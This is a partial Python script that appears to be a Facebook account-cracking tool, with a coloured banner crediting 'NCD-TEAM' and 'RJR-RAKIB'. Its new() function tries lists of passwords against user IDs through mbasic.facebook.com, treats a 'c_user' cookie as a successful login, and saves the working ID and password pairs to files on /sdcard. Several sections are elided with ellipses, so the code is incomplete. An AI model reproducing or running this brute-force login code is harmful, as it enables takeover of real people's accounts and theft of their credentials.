...
██   ████ ██ ███████  ██████     ██        ██   ██ ██ ██   ████  ██████                                        
\033[1;32m
\033[1;32m[+]     Owner    : NCD-TEAM
\033[1;32m[+]     Facebook : NILY ON 
\033[1;32m[+]     Version  : 1.0
\033[1;32m[+]     GitHub   : Mr-NILOY-404
...
try:
    ...
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m WELCOME RJR-RAKIB TOOLS..!')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
...
def news():
    ...
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in RJR-TEAM/ok.txt,RJR-TEAM/cp.txt')
    print('\033[1;31m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
...
def new(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'dpr': '1.5625',
            'referer': 'https://mbasic.facebook.com/menu/bookmarks/?ref_component=mbasic_home_header&ref_page=%2Fwap%2Fhome.php&refid=8&paipv=0&eav=AfZ7ojHHi8MqhAsL6fXF45r4_vGDJ2bwWoTbeQabMFidl3XOVkNs_ESG6Y-Cs1_Vhoc',
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/RJR-TEAM-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[65:80]
                print('[CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/RJR-TEAM-CP.txt', 'a').write( uid+' | '+ps+'')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \x1b[38;5;196m[\x1b[38;5;46mRJR-RAKIB\x1b[38;5;196m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
